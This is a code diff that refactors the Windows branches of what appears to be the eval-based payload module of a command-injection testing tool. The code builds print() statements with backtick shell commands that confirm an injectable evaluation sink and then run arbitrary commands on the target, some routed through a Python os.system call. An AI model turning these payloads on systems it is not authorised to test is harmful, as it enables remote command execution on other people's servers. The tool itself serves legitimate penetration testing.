@@ -14,6 +14,7 @@ For more see the file 'readme/COPYING' for copying permission.
 """
 
 from src.utils import settings
+from src.core.injections.controller import checks
 
 """
 The dynamic code evaluation (aka eval-based) technique.
@@ -21,40 +22,32 @@ The available "eval-based" payloads.
 """
 
 """
+Wrap the shell commands a payload runs in the evaluation sink's print statement.
+
+Every command has to leave its output on a line of its own: the results are read back as marker,
+output and marker separated by newlines, so anything printed without one runs into the next marker.
+"""
+def _print_statement(separator, commands, chain=None):
+  if separator == "":
+    return "print(" + ".".join("`" + command + "`" for command in commands) + ")"
+  return "print(`" + (chain or separator).join(commands) + "`)%3B"
+
+"""
+Read a value off a Windows command that prints no newline of its own, such as 'set /a'.
+"""
+def _windows_line(cmd):
+  return "for /f \"tokens=*\" %i in ('cmd /c \"" + cmd + "\"') do @echo %i"
+
+"""
 eval-based decision payload (check if host is vulnerable).
 """
 def decision(separator, TAG, randv1, randv2):
   if settings.TARGET_OS == settings.OS.WINDOWS:
-    if settings.SKIP_CALC:
-      if separator == "":
-        payload = ("print(`echo " + TAG + "`." +
-                    "`echo " + TAG + "`." +
-                    "`echo " + TAG + "`)" +
-                    separator
-                  )
-      else:
-        payload = ("print(`echo " + TAG +
-                    separator + "echo " + TAG +
-                    separator + "echo " + TAG + "`)%3B"
-                  )
-    else:
-      if separator == "":
-        payload = ("print(`echo " + TAG + "`." +
-                    "`for /f \"tokens=*\" %i in ('cmd /c \"" +
-                    "set /a (" + str(randv1) + "%2B" + str(randv2) + ")" +
-                    "\"') do @set /p = %i " + settings.CMD_NUL + "`." +
-                    "`echo " + TAG + "`." +
-                    "`echo " + TAG + "`)" +
-                    separator
-                  )
-      else:
-        payload = ("print(`echo " + TAG +
-                    separator + "for /f \"tokens=*\" %i in ('cmd /c \"" +
-                    "set /a (" + str(randv1) + "%2B" + str(randv2) + ")" +
-                    "\"') do @set /p = %i " + settings.CMD_NUL +
-                    separator + "echo " + TAG +
-                    separator + "echo " + TAG + "`)%3B"
-                  )
+    commands = ["echo " + TAG]
+    if not settings.SKIP_CALC:
+      commands.append(_windows_line("set /a (" + str(randv1) + "%2B" + str(randv2) + ")"))
+    commands = commands + ["echo " + TAG, "echo " + TAG]
+    payload = _print_statement(separator, commands, chain=checks.WINDOWS_CHAIN)
 
   else:
     if settings.SKIP_CALC:
@@ -92,32 +85,11 @@ __Warning__: The alternative shells are still experimental.
 def decision_alter_interpreter(separator, TAG, randv1, randv2):
   if settings.TARGET_OS == settings.OS.WINDOWS:
     python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"print(str(int(" + str(int(randv1)) + "%2B" + str(int(randv2)) + ")))\""
-    if settings.SKIP_CALC:
-      if separator == "":
-        payload = ("print(`echo " + TAG + "`." +
-                    "`echo " + TAG + "`." +
-                    "`echo " + TAG + "`)" +
-                    separator
-                  )
-      else:
-        payload = ("print(`echo " + TAG +
-                    separator + "echo " + TAG +
-                    separator + "echo " + TAG + "`)%3B"
-                  )
-    else:
-      if separator == "":
-        payload = ("print(`echo " + TAG + "`." +
-                    "` cmd /c " + python_payload + "`." +
-                    "`echo " + TAG + "`." +
-                    "`echo " + TAG + "`)" +
-                    separator
-                  )
-      else:
-        payload = ("print(`echo " + TAG +
-                    separator +python_payload +
-                    separator + "echo " + TAG +
-                    separator + "echo " + TAG + "`)%3B"
-                  )
+    commands = ["echo " + TAG]
+    if not settings.SKIP_CALC:
+      commands.append(python_payload)
+    commands = commands + ["echo " + TAG, "echo " + TAG]
+    payload = _print_statement(separator, commands, chain=checks.WINDOWS_CHAIN)
 
   else:
     python_payload = settings.LINUX_PYTHON_INTERPRETER + " -c \"print(str(int(" + str(int(randv1)) + "%2B" + str(int(randv2)) + ")))\""
@@ -155,25 +127,9 @@ Execute shell commands on vulnerable host.
 """
 def cmd_execution(separator, TAG, cmd):
   if settings.TARGET_OS == settings.OS.WINDOWS:
-    cmd = ( "for /f \"tokens=*\" %i in ('cmd /c " +
-            cmd +
-            "') do @set /p = %i " + settings.CMD_NUL
-          )
-    if separator == "":
-      payload = ("print(`echo " + TAG + "`." +
-                  "`echo " + TAG + "`." +
-                  "`" + cmd + "`." +
-                  "`echo " + TAG + "`." +
-                  "`echo " + TAG + "`)"
-                )
-
-    else:
-      payload = ("print(`echo '" + TAG + "'" +
-                  separator + "echo '" + TAG + "'" +
-                  separator + cmd +
-                  separator + "echo '" + TAG + "'" +
-                  separator + "echo '" + TAG + "'`)%3B"
-                )
+    # cmd.exe's echo prints quote characters literally, unlike a POSIX shell that strips them.
+    commands = ["echo " + TAG, "echo " + TAG, cmd, "echo " + TAG, "echo " + TAG]
+    payload = _print_statement(separator, commands, chain=checks.WINDOWS_CHAIN)
   else:
     settings.USER_APPLIED_CMD = cmd
     if separator == "":
@@ -202,25 +158,9 @@ def cmd_execution_alter_interpreter(separator, TAG, cmd):
       payload = (separator + cmd + settings.SINGLE_WHITESPACE
                 )
     else:
-      python_payload = ("for /f \"tokens=*\" %i in ('cmd /c " +
-                        settings.WIN_PYTHON_INTERPRETER + " -c \"import os; os.system('" + cmd + "')\"" +
-                        "') do @set /p = %i " + settings.CMD_NUL
-                       )
-
-      if separator == "":
-        payload = ("print(`echo " + TAG + "`." +
-                    "`echo " + TAG + "`." +
-                    "`" + python_payload + "`." +
-                    "`echo " + TAG + "`." +
-                    "`echo " + TAG + "`)"
-                  )
-      else:
-        payload = ("print(`echo '" + TAG + "'" +
-                    separator + "echo '" + TAG + "'" +
-                    separator + python_payload +
-                    separator + "echo '" + TAG + "'" +
-                    separator + "echo '" + TAG + "'`)%3B"
-                  )
+      python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"import os; os.system('" + cmd + "')\""
+      commands = ["echo " + TAG, "echo " + TAG, python_payload, "echo " + TAG, "echo " + TAG]
+      payload = _print_statement(separator, commands, chain=checks.WINDOWS_CHAIN)
   else:
     settings.USER_APPLIED_CMD = cmd
     if separator == "":
